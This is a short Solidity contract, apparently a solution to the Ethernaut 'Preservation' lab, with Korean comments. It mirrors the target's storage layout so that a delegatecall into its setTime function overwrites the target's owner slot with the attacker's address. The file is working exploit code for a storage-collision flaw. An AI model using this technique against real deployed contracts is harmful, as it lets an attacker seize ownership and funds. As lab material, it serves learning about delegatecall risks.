// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationAttack {
    // slot 정렬을 Preservation과 똑같이
    address public timeZone1Library; // slot 0
    address public timeZone2Library; // slot 1
    address public owner;            // slot 2
    uint256 public storedTime;       // slot 3

    // Preservation에서 delegatecall될 함수
    function setTime(uint256) public {
        owner = msg.sender; // Preservation의 owner(slot 2)를 공격자로 덮어씀
    }
}